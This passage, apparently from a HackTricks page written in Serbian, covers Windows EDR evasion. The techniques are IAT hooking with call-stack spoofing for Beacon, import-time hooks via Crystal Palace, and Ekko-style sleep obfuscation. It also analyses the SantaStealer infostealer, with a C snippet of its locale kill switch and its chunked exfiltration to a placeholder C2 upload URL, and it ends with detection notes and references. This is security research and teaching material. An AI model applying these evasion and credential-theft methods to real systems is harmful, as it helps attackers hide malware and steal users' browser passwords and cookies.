  - Radi kompatibilnosti, eksportovati interface tako da Aggressor script (ili ekvivalent) može registrovati koje API‑je da hook‑uje za Beacon, BOFs i post‑ex DLLs.

Zašto IAT hooking ovde
- Radi za bilo koji kod koji koristi hook‑ovani import, bez menjanja tool code‑a ili oslanjanja na Beacon da proxy‑uje određene API‑je.
- Obuhvata post‑ex DLLs: hooking LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/stack evasion na njihove API pozive.
- Vraća pouzdano korišćenje post‑ex komandi za pokretanje procesa protiv detekcija zasnovanih na call‑stack‑u tako što wrap‑ujete CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudokod)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR i pre prvog korišćenja importa. Reflective loaders poput TitanLdr/AceLdr pokazuju hooking tokom DllMain učitanog modula.
- Drži wrapper-e male i PIC-safe; razreši pravi API kroz originalnu IAT vrednost koju si zabeležio pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje writable+executable stranica.

Call‑stack spoofing stub
- Draugr‑style PIC stubs grade lažni call chain (return addresses u benignim modulima) i zatim pivotuju u pravi API.
- Ovo pobedjuje detekcije koje očekuju kanonske stack-ove iz Beacon/BOFs do osetljivih API-ja.
- Upari sa stack cutting/stack stitching tehnikama da dospeš unutar očekivanih frejmova pre API prologa.

Operational integration
- Prepend-uj reflective loader na post‑ex DLLs tako da se PIC i hook-ovi inicijalizuju automatski kada je DLL učitan.
- Koristi Aggressor script da registruješ target APIs tako da Beacon i BOFs transparentno imaju koristi od istog evasion puta bez izmena koda.

Detection/DFIR considerations
- IAT integrity: unosi koji se razrešavaju na non‑image (heap/anon) adrese; periodična verifikacija import pointer-a.
- Stack anomalies: return adrese koje ne pripadaju učitanim image-ima; nagle tranzicije ka non‑image PIC; nedosledno RtlUserThreadStart ancestry.
- Loader telemetry: in‑process upisi u IAT, rana DllMain aktivnost koja modifikuje import thunks, neočekivani RX regioni kreirani pri load-u.
- Image‑load evasion: ako hook-uješ LoadLibrary*, prati sumnjiva učitavanja automation/clr assemblies korelisana sa memory masking događajima.

Related building blocks and examples
- Reflective loaders koji rade IAT patching tokom load-a (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Ako kontrolišeš reflective loader, možeš hook-ovati importe **during** `ProcessImports()` zamenjujući loader-ov `GetProcAddress` pokazivač custom resolver-om koji prvo proverava hook-ove:

- Build-uj **resident PICO** (persistent PIC object) koji opstaje i nakon što transient loader PIC oslobodi sebe.
- Export-uj funkciju `setup_hooks()` koja prepisuje loader-ov import resolver (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress`, preskoči ordinal imports i koristi hash‑based hook lookup kao `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom delegiraj pravom `GetProcAddress`.
- Registruj hook target-e pri link vremenu koristeći Crystal Palace `addhook "MODULE$Func" "hook"` unose. Hook ostaje validan jer živi unutar resident PICO.

Ovo daje **import-time IAT redirection** bez patchovanja code sekcije učitanog DLL-a posle load-a.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks se pokreću samo ako funkcija zaista postoji u ciljnom IAT-u. Ako modul razrešava API-je preko PEB-walk + hash (bez import unosa), forsiraj pravi import da bi loader-ov `ProcessImports()` put video to:

- Zameni hashed export resolution (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom kao `&WaitForSingleObject`.
- Kompajler emituje IAT entry, omogućavajući interception kada reflective loader razrešava importe.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Umesto da patch-uješ `Sleep`, hook-uj **actual wait/IPC primitives** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja, umotaj poziv u Ekko-style obfuscation chain koji enkriptuje in-memory image tokom idle:

- Koristi `CreateTimerQueueTimer` da zakažeš sekvencu callback-ova koji pozivaju `NtContinue` sa crafted `CONTEXT` frejmovima.
- Tipičan chain (x64): postavi image na `PAGE_READWRITE` → RC4 enkriptuj preko `advapi32!SystemFunction032` preko celog mapped image-a → izvrši blocking wait → RC4 dekriptuj → **restore per-section permissions** šetajući PE sekcijama → signaliziraj završetak.
- `RtlCaptureContext` daje template `CONTEXT`; kloniraj ga u više frejmova i postavi registre (`Rip/Rcx/Rdx/R8/R9`) da pozoveš svaki korak.

Operativni detalj: vrati “success” za duga čekanja (npr. `WAIT_OBJECT_0`) tako da caller nastavi dok je image maskiran. Ovaj obrazac skriva modul od scanner-a tokom idle prozora i izbegava klasični “patched `Sleep()`” potpis.

Detection ideas (telemetry-based)
- Burst-ovi `CreateTimerQueueTimer` callback-ova koji pokazuju na `NtContinue`.
- `advapi32!SystemFunction032` korišćen za velike contiguous buffer-e veličine image-a.
- Large-range `VirtualProtect` praćen custom per-section permission restore.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustruje kako moderni info‑stealeri mešaju AV bypass, anti-analysis i credential access u jednom workflow-u.

### Keyboard layout gating & sandbox delay

- Konfiguraciona zastavica (`anti_cis`) izlistava instalirane keyboard layouts preko `GetKeyboardLayoutList`. Ako se pronađe ćirilični layout, sample ostavlja prazan `CIS` marker i terminira pre pokretanja stealera, osiguravajući da se nikada ne detonira na izuzetim lokalitetima dok ostavlja hunting artefakt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Višeslojna logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svako ime prilagođenim rolling checksum-om i poredi ga sa ugrađenim blok-listama za debagere/sandbox-e; ponavlja checksum nad imenom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B ispituje sistemska svojstva (donja granica broja procesa, nedavni uptime), poziva `OpenServiceA("VBoxGuest")` da detektuje VirtualBox dodatke i izvodi vremenske provere oko sleep-ova da uoči single-stepping. Bilo koji pogodak prekida izvršavanje pre pokretanja modula.

### Fileless helper + double ChaCha20 reflective loading

- Primarni DLL/EXE ugrađuje Chromium credential helper koji se ili dropuje na disk ili mapira ručno u memoriji; fileless režim sam rešava imports/relocations tako da nijedan helper artefakt nije zapisan.
- Taj helper čuva DLL drugog stepena šifrovan dvaput ChaCha20-om (dva 32-bajtna ključa + 12-bajtni nonces). Nakon oba prolaza, reflektivno učitava blob (bez `LoadLibrary`) i poziva eksporte `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- ChromElevator rutine koriste direct-syscall reflective process hollowing da injektuju u aktivan Chromium browser, naslede AppBound Encryption ključeve i dekriptuju lozinke/cookies/credit cards direktno iz SQLite baza uprkos ABE hardeningu.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iterira globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće po jedan thread za svaki omogućen modul (Telegram, Discord, Steam, screenshots, documents, browser extensions, itd.). Svaki thread upisuje rezultate u deljene buffere i prijavljuje broj fajlova nakon otprilike 45s join prozora.
- Kada se završi, sve se zipuje pomoću statički linkovane biblioteke `miniz` kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim spava 15s i strimuje arhivu u chunk-ovima od 10 MB preko HTTP POST-a na `http://<C2>:6767/upload`, lažirajući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, a poslednji chunk dodaje `complete: true` da C2 zna da je reassembly završen.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
